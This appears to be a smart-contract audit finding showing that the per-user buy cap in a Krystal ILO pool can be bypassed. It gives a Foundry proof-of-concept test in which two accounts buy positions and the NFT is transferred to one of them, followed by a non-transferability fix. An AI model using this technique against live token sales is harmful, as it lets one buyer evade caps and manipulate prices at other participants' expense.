# Vulnerability details

## Impact
Bypassing the cap can lead to price manipulation of the sale token, depending on the tokenomics of the project. When the team behind the sale decides to sell a large portion of the total supply of the sale token and doesn't implement a whitelist of trusted actors, a single user may buy most of the tokens and manipulate the price.

## Proof of Concept
One user can only buy up to the maximum user cap specified when launching an ILO pool. The user receives an NFT representing their share of the total liquidity. However, one user can buy multiple NFTs and transfer them to a single account that would later claim the liquidity, as demonstrated in the following foundry test.
```solidity
function testBypassUserCap() external {
    address alice = makeAddr("alice");
    address alice_two = makeAddr("alice_two");
    _prepareBuyFor(alice);
    _prepareBuyFor(alice_two);
        
    // buy two positions, going over max user cap combined
    (uint256 tokenIdAlice,) = _buyFor(alice, SALE_START+1, 60_000 ether);
    (uint256 tokenIdAliceTwo,) = _buyFor(alice_two, SALE_START+1, 30_000 ether);

    // transfer second position to main account
    vm.prank(alice_two);
    ERC721(iloPool).transferFrom(alice_two, alice, tokenIdAliceTwo);

    _writeTokenBalance(SALE_TOKEN, iloPool, 95000 * 4 ether);
    vm.warp(SALE_END + 1);
    vm.prank(address(iloManager));
    IILOPool(iloPool).launch();
    vm.warp(VEST_END_1);

    vm.startPrank(alice);
    IILOPool(iloPool).claim(tokenIdAlice);
    IILOPool(iloPool).claim(tokenIdAliceTwo);
    vm.stopPrank();

    // alice bought around 72 000 sale tokens 
    console.log(IERC20(SALE_TOKEN).balanceOf(alice));
    assertGt(IERC20(SALE_TOKEN).balanceOf(alice), 60_000 ether);
}
```

## Tools Used
Manual review, foundry test

## Recommended Mitigation Steps
Consider making the krystal ILO Pool NFT non-transferrable by implementing the `_beforeTokenTransfer` function like this:

```solidity
function _beforeTokenTransfer(address from, address to, uint256 tokenId) internal virtual
    override(ERC721) {
    revert("non-transferrable");
}
```

This does not prevent a single user from buying more than allowed, so the team should preferably use a whitelist or design their tokenomics to prevent a whale from manipulating the price if they buy up all the tokens in the sale.
